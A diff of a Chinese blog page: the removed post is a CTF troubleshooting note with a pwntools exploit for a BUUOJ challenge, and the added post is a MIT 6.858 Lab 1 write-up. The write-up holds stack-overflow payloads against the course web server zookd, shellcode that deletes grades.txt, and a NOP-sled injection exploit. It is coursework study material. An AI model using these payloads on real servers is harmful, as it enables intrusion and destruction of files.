@@ -16,27 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解决或未解决的奇怪问题">
+    <meta name="description" content="mit 计算机系统安全实验">
 <meta property="og:type" content="article">
-<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
-<meta property="og:url" content="https://isolator-1.github.io/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:title" content="mit6858">
+<meta property="og:url" content="https://isolator-1.github.io/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="解决或未解决的奇怪问题">
+<meta property="og:description" content="mit 计算机系统安全实验">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/problems/1.jpg">
-<meta property="article:published_time" content="2023-12-05T05:58:00.000Z">
-<meta property="article:modified_time" content="2023-12-05T06:08:36.755Z">
+<meta property="article:published_time" content="2023-12-06T02:30:00.000Z">
+<meta property="article:modified_time" content="2023-12-06T12:24:37.024Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="Others">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/problems/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
+  <title>mit6858 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
+            <span id="subtitle" data-typed-text="mit6858"></span>
           
         </div>
 
@@ -226,8 +223,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-05 13:58" pubdate>
-          December 5, 2023 pm
+        <time datetime="2023-12-06 10:30" pubdate>
+          December 6, 2023 am
         </time>
       </span>
     
@@ -238,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k words
+          4.6k words
         
       </span>
     
@@ -249,7 +246,7 @@
         
         
         
-          14 mins
+          39 mins
         
       </span>
     
@@ -287,52 +284,75 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
+            <h1 style="display: none">mit6858</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>vmware自带的vmtools安装了也复制不进来</strong></p>
-<p>虚拟机执行命令</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>
+                <h2 id="mit-系统安全实验"><a href="#mit-系统安全实验" class="headerlink" title="mit 系统安全实验"></a>mit 系统安全实验</h2><p>参考自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">arttnba3大佬的博客</a>🐤</p>
+<p>地址 <a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html">https://css.csail.mit.edu/6.858/2022/labs/lab1.html</a></p>
+<p>给了一个虚拟机<a target="_blank" rel="noopener" href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">ubuntu 21.10</a>的vmdk，安装完之后是一个tty，发现没有net-tools，也不能从虚拟机外复制进来内容，去学习了一下发现<code>ip addr</code>也可以查看ip，不过这个输出有点多，这个虚拟机终端也没法往上滚动，加了一个grep 192.168就好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~$ ip addr | grep 192.168<br>    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0<br></code></pre></td></tr></table></figure>
 
-<p>如果拖放文件的时候出现了</p>
-<p><img src="/img/problems/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure>
+<p>然后就可以ssh了</p>
+<blockquote>
+<p>但是不知道为什么ubuntu21.10（代号impish）没法换源，好像阿里清华直接没有这个源，我又去ubuntu官方源试了一下，还是安装不了。是21.10不再支持了嘛？（不懂）</p>
+<p>最后直接用ubuntu20.04的源…目前还没啥问题</p>
+</blockquote>
+<p>实验的内容在<code>git clone https://web.mit.edu/6858/2022/lab.git </code></p>
+<h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>按照说明，首先make一下，然后运行<code>./clean-env.sh ./zookd 8080</code></p>
+<blockquote>
+<p>这里有个很玄学的问题是，我在物理机上clone下来lab，再用vscode传虚拟机，不光程序运行起来访问不到网页，make的时候也有警告。在虚拟机里clone下来的就什么问题都没有😶‍🌫️</p>
+</blockquote>
+<p>然后可以访问到网页，是一个登陆界面</p>
+<h4 id="lab1-exercise-1-2"><a href="#lab1-exercise-1-2" class="headerlink" title="lab1 exercise 1 + 2"></a>lab1 exercise 1 + 2</h4><p>exercise1 让在<code>zookd.c</code>和<code>http.c</code>找漏洞</p>
+<p>main函数在zookd.c中下面解释各个函数干了什么</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">main : 传入参数port 调用run<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>run_server : 通过start<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span>初始化socket，<br>             然后一个死循环，对每个accept fork出一个线程，执行process<span class="hljs-constructor">_client(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>process_client : <br>    <span class="hljs-number">1.</span> http_request_line (http.c) : 处理请求包的第一行，即<span class="hljs-string">&quot;GET /foo.html HTTP/1.0&quot;</span>这种<br>    <span class="hljs-number">2.</span> http_request_headers (http.c) : 一个死循环处理从第二行开始的所有内容，存在栈溢出。<br>       accept来的buf<span class="hljs-literal">[<span class="hljs-number">8192</span>]</span>进行了防溢出处理，但是value和envvar长度只有<span class="hljs-number">512</span>，可以溢出<br>       每一对envvar和value形成了键值对，存储到了环境变量里<br>    <span class="hljs-number">3.</span> http_serve (http.c) : 后面再说<br></code></pre></td></tr></table></figure>
 
-<p>将<code>WaylandEnable=false</code>注释掉</p>
-<p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p>
-<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
-<p>本来是很简单的一个溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
+<p>exercise2 只说要让程序崩溃就行，不用劫持控制流，那直接发送一个大的包过去就完了。要求写一个<code>exploit-2.py</code>的脚本，在lab文件夹里有给好的模板<code>exploit-template.py</code>，改一下<code>build_exploit</code>就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \<br>            <span class="hljs-string">b&quot;hack: &quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">8100</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
 
-<p>但是不加sleep无法通过</p>
-<p>有人说是python同时发送多个字符串时会合并(?)</p>
-<p>那什么时候情况下需要在sendline前面加一个sleep</p>
-<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>
-<hr>
-<h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>
+<p>观察程序报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ ./clean-env.sh ./zookd 8080<br><span class="hljs-built_in">exec</span> <span class="hljs-built_in">env</span> - PWD=/home/student/lab SHLVL=0 setarch x86_64 -R ./zookd 8080<br>Child process 9738 terminated incorrectly, receiving signal 11<br></code></pre></td></tr></table></figure>
 
-<p>用到这个快捷方式时要修改一下</p>
-<h4 id="sendlineafter的问题"><a href="#sendlineafter的问题" class="headerlink" title="sendlineafter的问题"></a>sendlineafter的问题</h4><p>要加上换行符<code>\n</code>，否则匹配不上</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure>
+<p>执行检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-crash<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-crash.sh zookd-exstack ./exploit-2.py<br>10453 --- SIGSEGV &#123;si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffffffff000&#125; ---<br>10453 +++ killed by SIGSEGV (core dumped) +++<br>10416 --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=10453, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=52&#125; ---<br>PASS ./exploit-2.py<br></code></pre></td></tr></table></figure>
+
+<h4 id="lab1-exercise-3"><a href="#lab1-exercise-3" class="headerlink" title="lab1 exercise 3"></a>lab1 exercise 3</h4><p>lab里给了一个shellcode.S，在make时会编译成shellcode.bin，可以用<code>./run-shellcode shellcode.bin</code>来执行这个程序。</p>
+<p>原本是execve(“/bin/sh”)，exercise3 要求把它改成删除<code>grades.txt</code>。给的shellcode.S是AT&amp;T汇编，抄的大佬的代码😭😭😭😭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>	.type	main, @function<br><br>main:<br>	/* store the string on the stack */<br>	xorq  %rax, %rax<br>	pushq %rax<br>	movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>	pushq %rax<br>	movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>	pushq %rax<br>	movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>	pushq %rax<br><br>	/* unlink(rsp) */<br>	movq  %rsp, %rdi<br>	movq  $87, %rax /* SYS_unlink */<br>	syscall<br><br>	/* exit() */      不加exit会报个segmentation fault，但是也能执行<br>	xorq  %rdi, %rdi<br>	movq  $60, %rax	/* SYS_exit */<br>	syscall<br></code></pre></td></tr></table></figure>
+
+<h4 id="lab1-exercise-4"><a href="#lab1-exercise-4" class="headerlink" title="lab1 exercise 4"></a>lab1 exercise 4</h4><p>exercise2 的栈溢出注入shellcode，执行的程序换了一下，换成没开NX的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在url_decode函数里，当sp字符串里看到了\x00字符，就会终止向valuie里复制字符串，但是又有把%加两个digit转换为数字的case，因此payload要<code>.replace(&quot;\x00,%00&quot;)</code>再发送。</p>
+</blockquote>
+<p>接下来就是寻找字符串的位置和返回地址的位置，虽然<code>value</code>和<code>envvar</code>看上去都可以，但是显然value更简单一点，有两种方法：</p>
+<p>第一种：反正有源码，直接print出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value addr : %p\n&quot;</span>, &amp;value);<br><span class="hljs-type">void</span> *stackAddress;<br>__asm__(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (stackAddress));<br>stackAddress = (<span class="hljs-type">void</span>*)((<span class="hljs-type">char</span>*)stackAddress + <span class="hljs-number">8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Return Address Stack Address: %p\n&quot;</span>, stackAddress);<br></code></pre></td></tr></table></figure>
+
+<p>第二种：调试，gdb -p $(pgrep zookd-)<code>，下断点</code>b http.c:xxx<code>，查看变量地址</code>print &amp;value`，拿到shellcode地址，再用rbp+8拿到返回地址（或者info frame）</p>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    req += (<br>        shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode)) +  p64(stack_buffer)<br>    ).replace(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <span class="hljs-comment"># 注意这里额外的一行</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+<p>在<code>http_request_headers</code>的死循环跳出的条件是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>因此想要跳出循环，必须最后要有一个空行！！！！！！！😭😭😭😭😭😭😭😭😭😭😭😭</p>
+<p>我在这卡了一下午，一直以为是我的栈地址不对😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭</p>
+<p>再学习一下大佬的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;\r\n&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>只要返回地址能够命中4096个nop中的任何一个，就能执行处后面的shellcode（但是这个地址又是去哪看的呢😶‍🌫️</p>
+<p>执行检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ <span class="hljs-built_in">chmod</span> +x ./exploit-4.py <br>student@6858-v22:~/lab$ make check-exstack<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>PASS ./exploit-4.py<br></code></pre></td></tr></table></figure>
 
 
 
-<h4 id="python调用c库函数"><a href="#python调用c库函数" class="headerlink" title="python调用c库函数"></a>python调用c库函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<h4 id="lab1-exercise5"><a href="#lab1-exercise5" class="headerlink" title="lab1 exercise5"></a>lab1 exercise5</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure>
 
-
-
-<h4 id="安装ubuntu18，pwndbg安装不上（setup-sh总有问题）"><a href="#安装ubuntu18，pwndbg安装不上（setup-sh总有问题）" class="headerlink" title="安装ubuntu18，pwndbg安装不上（setup.sh总有问题）"></a>安装ubuntu18，pwndbg安装不上（setup.sh总有问题）</h4><p>选择用pwndbg release的安装包，安装之后把<code>/usr/bin/gdb</code>给改成<code>/usr/ bin/pwndbg</code>的软连接</p>
-<p>然后在调用<code>gdb.attach</code>时弹不出来新的窗口：</p>
-<p>采用tmux解决，安装tmux后，程序开头加上一句话</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br></code></pre></td></tr></table></figure>
-
-<p>然后再命令行先运行sudo tmux，然后运行exp.py，就可以弹出来gdb了。</p>
-<p>然后发现无法滚动鼠标，使用<code>ctrl + shift + b + :</code>进入命令模式，输入<code>set -g mouse on</code></p>
-<p>就可以滚动终端了</p>
+<p>开了nx，ret2libc。直接来学习一下大佬的exp吧，我以前确实没见过在rop链里通过malloc存储字符串的。</p>
 
                 
               </div>
@@ -351,7 +371,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a>
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -368,8 +388,6 @@
       
         <a href="/tags/ctf-pwn/">#ctf-pwn</a>
       
-        <a href="/tags/Others/">#Others</a>
-      
     </div>
   
 </div>
@@ -380,8 +398,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>遇到的奇奇怪怪问题汇总</div>
-      <div>https://isolator-1.github.io/2023/12/05/杂项/遇到的奇奇怪怪问题汇总/</div>
+      <div>mit6858</div>
+      <div>https://isolator-1.github.io/2023/12/06/学习笔记/mit6858/</div>
     </div>
     <div class="license-meta">
       
@@ -393,7 +411,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>December 5, 2023</div>
+          <div>December 6, 2023</div>
         </div>
       
       
@@ -425,18 +443,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/" title="mit6858">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">mit6858</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/01/ctf-pwn/tcache%20attack/" title="tcache attack">
-                        <span class="hidden-mobile">tcache attack</span>
+                      <a href="/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" title="遇到的奇奇怪怪问题汇总">
+                        <span class="hidden-mobile">遇到的奇奇怪怪问题汇总</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
